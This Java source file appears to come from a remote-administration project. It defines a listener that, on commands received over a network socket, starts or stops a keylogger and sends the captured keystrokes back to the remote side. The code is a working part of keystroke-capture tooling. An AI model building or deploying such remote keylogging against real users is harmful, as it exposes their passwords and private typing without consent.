package controller;


import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;

import model.KeyLog;
import Program.Server;

import java.io.IOException;
import java.util.ArrayList;

import javax.swing.JOptionPane;
public class KeyLogListener {
	
	public KeyLog keyLog = new KeyLog();
	
	public KeyLogListener() {
		
		
		
		try {
			
			
			String keyRequestLine;
			String keyLogResult;
			
			int count = 0;
			
			while (true) {
				keyRequestLine = Server.in.readLine();
				if (keyRequestLine.equals("HOOK"))
				{
					JOptionPane.showMessageDialog(null, "Already hook!");
					KeyLog.Keylogger(keyLog);
				}
				if (keyRequestLine.equals("UNHOOK"))
				{
					
					JOptionPane.showMessageDialog(null, "Already unhook" + "!");
					KeyLog.UnKeyLogger(keyLog);					
				}
				if (keyRequestLine.equals("SHOW TEXT"))
				{
					keyLogResult = keyLog.keylog;
					Server.out.write(keyLogResult);
					Server.out.newLine();
					Server.out.flush();
					JOptionPane.showMessageDialog(null, "Already send!" +keyLogResult);
					keyLog.keylog = "";					
				}
				
				if (keyRequestLine.equals("EXIT_KEYSTROKE"))
				{
					return;
				}
				
			}
		} catch (IOException e) {

			e.printStackTrace();
			
		}
		
		
	}
}